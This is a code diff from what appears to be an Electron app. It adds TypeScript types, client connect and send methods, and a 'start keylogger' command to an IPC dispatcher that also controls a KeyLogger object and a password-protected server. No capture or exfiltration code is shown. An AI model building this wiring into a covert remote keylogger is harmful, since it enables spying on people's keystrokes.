@@ -80,9 +80,9 @@ const client = new Client(sendMessageToMainWindow);
 
 const keylogger = new KeyLogger(sendMessageToMainWindow);
 
-let currentInstance = "Standby";
+let currentInstance: string = "Standby";
 
-function sendMessageToMainWindow(message) {
+function sendMessageToMainWindow(message: string) {
 	if (!domHasLoaded)return "DOM HASN'T LOADED YET!";
 
 	mainWindow.webContents.send("mainWindowMsg", message);
@@ -96,14 +96,25 @@ ipcMain.handle("mainWindow", async (e, ...args) => {
 
 const ipcMethods = {
 	server: {
-		start: function(port, host, password) {
+		start: function(port: number, host: string, password?: string) {
 			return server.start(port, host, password);
 		},
 		stop: function() {
 			return server.stop();
 		},
-		sendMessage(message) {
+		sendMessage(message: any) {
 			return server.sendMessageToAll(message);
+		}
+	},
+	client: {
+		connect: async function(port: number, host: string, password: string, extraData: any) {
+			return await client.connect(port, host, password, extraData);
+		},
+		disconnect: function() {
+			return client.disconnect();
+		},
+		sendMessage(message: string) {
+			return client.sendMessage(message);
 		}
 	},
 	keyLogger: {
@@ -114,23 +125,28 @@ const ipcMethods = {
 			return keylogger.stop();
 		}
 	},
-	exec: async function(args) {
-		const method = args[0];
-		const extraArgs = args[1];
+	exec: async function(args: any[]) {
+		const method: string = args[0];
+		const extraArgs: any[] = args[1];
 
-		switch (method) {
+		if (typeof method != "string") 
+			return "Method parameter not of string type!";
+
+		switch (method.toLowerCase()) {
 			case "start server":
 				if (currentInstance == "Client")
 					return "You can't be a server when you're a client!";
 
 				currentInstance = "Server";
-
-				return this.server.start(extraArgs[0], extraArgs[1], extraArgs[2]);
+				return ipcMethods.server.start(extraArgs[0], extraArgs[1], extraArgs[2]);
 			case "send message":
 				if (currentInstance == "Server") {
-				
+					return ipcMethods.server.sendMessage(extraArgs[0]);
+				} else {
+					return ipcMethods.client.sendMessage(extraArgs[0]);
 				}
-				break;
+			case "start keylogger":
+
 			default:
 				return "Unknown Method. Better luck next time ¯\\_(ツ)_/¯";
 		}
